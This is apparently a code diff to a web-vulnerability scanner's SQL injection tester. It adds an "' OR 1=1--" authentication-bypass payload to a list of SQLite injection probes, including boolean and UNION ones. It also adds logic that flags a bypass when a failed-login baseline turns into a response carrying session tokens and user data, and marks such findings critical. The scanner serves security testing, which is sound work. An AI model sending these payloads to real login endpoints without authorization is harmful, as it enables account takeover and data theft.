@@ -5353,6 +5353,7 @@ def _match_dbms_fingerprint(body: str | None, baseline_body: str | None = None) 
 DBMS_SQLI_PAYLOADS = {
     "sqlite": [
         # Basic payloads
+        ("' OR 1=1--", "auth_bypass_boolean", "Authentication bypass boolean injection"),
         ("')) --", "comment_bypass", "Try double-paren close with comment"),
         ("')) OR 1=1--", "boolean_always_true", "Boolean injection"),
         ("')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "union_9col", "Union probe"),
@@ -6414,6 +6415,7 @@ async def smart_sqli_test(
                         fingerprint = _match_dbms_fingerprint(body_out, baseline_body)
                         if fingerprint:
                             results["dbms_detected"] = fingerprint["dbms"]
+                    is_auth_bypass = any("Authentication bypass via SQLi" in item for item in evidence)
                     finding_dict = {
                         "type": "SQLi",
                         "method": "GET",
@@ -6424,7 +6426,7 @@ async def smart_sqli_test(
                         "dbms": results["dbms_detected"],
                         "evidence": evidence,
                         "confidence": 0.9 if len(evidence) > 1 else 0.7,
-                        "severity": "critical" if "schema" in technique else "high",
+                        "severity": "critical" if "schema" in technique or is_auth_bypass else "high",
                     }
                     request_headers = _headers_from_curl_args(auth_args)
                     if request_headers:
@@ -6601,6 +6603,7 @@ async def smart_sqli_test(
                         fingerprint = _match_dbms_fingerprint(body_out, baseline_body_out)
                         if fingerprint:
                             results["dbms_detected"] = fingerprint["dbms"]
+                    is_auth_bypass = any("Authentication bypass via SQLi" in item for item in evidence)
                     request_headers = _headers_from_curl_args(auth_args)
                     if method in ("POST", "PUT", "PATCH") and content_type:
                         request_headers.setdefault("Content-Type", content_type)
@@ -6615,7 +6618,7 @@ async def smart_sqli_test(
                         "dbms": results["dbms_detected"],
                         "evidence": evidence,
                         "confidence": 0.9 if len(evidence) > 1 else 0.7,
-                        "severity": "critical" if "schema" in technique else "high",
+                        "severity": "critical" if "schema" in technique or is_auth_bypass else "high",
                     }
                     # Include content_type and original body for POST verification replay
                     if method in ("POST", "PUT", "PATCH"):
@@ -6993,6 +6996,51 @@ def _try_parse_json(text: str | None) -> dict | list | None:
         return None
 
 
+def _auth_success_signals_from_body(body: str | None) -> list[str]:
+    """Return strict authentication-success signals from a response body."""
+    if not body:
+        return []
+    signals: set[str] = set()
+    parsed = _try_parse_json(body)
+    if parsed is not None:
+        keys = {key.lower() for key in _extract_json_keys(parsed)}
+        auth_key_fragments = (
+            "token", "access_token", "accesstoken", "refresh_token", "refreshtoken",
+            "jwt", "session", "authentication", "authorization",
+        )
+        identity_key_fragments = (
+            "user", "username", "email", "role", "roles", "account", "profile", "umail",
+        )
+        if any(any(fragment in key for fragment in auth_key_fragments) for key in keys):
+            signals.add("auth_token_or_session")
+        if any(any(fragment in key for fragment in identity_key_fragments) for key in keys):
+            signals.add("user_identity_data")
+
+    lowered = body.lower()
+    auth_markers = (
+        '"token"', '"access_token"', '"accessToken"', '"refresh_token"',
+        '"authentication"', '"authorization"', '"jwt"', '"session"',
+    )
+    identity_markers = (
+        '"user"', '"username"', '"email"', '"role"', '"roles"', '"account"', '"profile"', '"umail"',
+    )
+    if any(marker.lower() in lowered for marker in auth_markers):
+        signals.add("auth_token_or_session")
+    if any(marker.lower() in lowered for marker in identity_markers):
+        signals.add("user_identity_data")
+    return sorted(signals)
+
+
+def _looks_like_auth_failure_response(status: int | None, body: str | None) -> bool:
+    lowered = (body or "").lower()
+    failure_markers = (
+        "invalid credentials", "invalid email", "invalid password",
+        "invalid email or password", "login failed", "authentication failed",
+        "unauthorized", "forbidden", "wrong password", "user not found",
+    )
+    return status in {400, 401, 403, 404, 422} or any(marker in lowered for marker in failure_markers)
+
+
 def _extract_json_keys(obj: Any, prefix: str = "") -> set[str]:
     """Extract all keys from a JSON object recursively."""
     keys: set[str] = set()
@@ -7115,6 +7163,21 @@ def _check_sqli_response(
                     rl = response_arrays[key]
                     if bl != rl:
                         evidence.append(f"Array '{key}' length: {bl} -> {rl}")
+
+    # 3b. Authentication-bypass proof for login endpoints. A failed-login
+    # baseline becoming an authenticated JSON session is strong evidence for
+    # SQLi even when the app does not expose DB errors or timing signals.
+    if not strong_signal and _looks_like_auth_failure_response(baseline_status, baseline_body):
+        success_signals = _auth_success_signals_from_body(out)
+        if status_code is not None and 200 <= status_code < 300 and {
+            "auth_token_or_session",
+            "user_identity_data",
+        }.issubset(set(success_signals)):
+            strong_signal = True
+            evidence.append(
+                "Authentication bypass via SQLi: invalid-login baseline returned an authenticated session "
+                f"({', '.join(success_signals)})"
+            )
 
     # 4. Boolean-based detection (true/false condition comparison)
     if "boolean" in technique and true_condition_len is not None:
